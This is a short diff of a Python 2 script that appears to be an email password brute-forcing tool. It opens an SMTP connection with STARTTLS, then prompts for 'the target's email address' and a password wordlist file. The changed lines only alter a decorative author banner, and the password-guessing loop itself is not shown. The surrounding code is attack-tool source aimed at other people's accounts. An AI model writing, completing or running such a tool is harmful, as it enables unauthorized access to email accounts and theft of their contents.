@@ -9,13 +9,9 @@ smtpserver.ehlo()
 smtpserver.starttls()
 
 def display_info():                                        
-        print colored('\r\n¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦','green')
 	print colored(' \t by; h.pishin07	')
 	print colored( '     pishiiiiiiiiii')
-        print colored( 'iran')   
-	print colored('¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦','green')
-print "\r\n"
-display_info()
+        print colored( 'iran')
 user = raw_input("Enter the target's email address: ")
 passwfile = raw_input("Enter the password file name: ")
 passwfile = open(passwfile, "r")
